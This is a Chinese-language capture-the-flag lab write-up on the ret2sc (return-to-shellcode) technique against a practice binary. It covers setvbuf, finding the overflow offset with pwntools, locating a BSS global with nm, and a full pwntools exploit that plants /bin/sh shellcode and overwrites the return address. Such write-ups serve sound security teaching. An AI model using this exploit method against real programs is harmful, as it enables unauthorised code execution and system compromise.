# Lab3 ret2sc

## 先備知識

### setvbuf()

`int setvbuf(FILE *stream, char *buffer, int mode, size_t size)`

定義了stream的buffer怎麼被緩衝

- buffer 分配的緩衝區，如果是NULL會自動分配
- mode 0: FUll  buffering、1: Line buffering、2: No buffering
- size 單個緩衝區大小

這裡使用setvbuf(stdout, 0, 2, 0)設定為無緩衝

### Global variable

global variable的address會是固定的

### how to find offest

>>> from pwn import *

>>> cyclic(100)

>>> cyclic_find("<return overflow string>")

### nm 指令

顯示關於對象文件、可執行文件以及對象文件庫裏的符號信息。

- 故我們可以用 `nm ./ret2sc` 找到name這個global variable的位置
- 或是用`gdb% x/x &name`也可以

## Return to Shellcode

1. 將要執行的shellcode寫入可寫且可執行的變數中
2. 利用BOF return跳至該變數

## Solve

### 分析

1. 先用checksec檢查，發現NX是關的，代表他是可寫且可執行
2. 有兩個input，其中`name`為全域變數存放在BSS區段，而`buf`則存放在stack中
3. 利用pwn找到offset是32 ( 到return的距離 )

### 解題策略

將shellcode塞在name中，並且利用BOF將return的值蓋掉，跳轉到name的地方。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./ret2sc')
name = 0x804a060 # address of name (BSS) where we are going to placed return 
r.recvuntil(":")
r.sendline(asm(shellcraft.sh())) # /bin/shell shellcode which is 24 bytes
r.recvuntil(":")
payload = "a"*32 # buffer size 
payload += p32(name) # overflow return 
r.sendline(payload)

r.interactive()
```
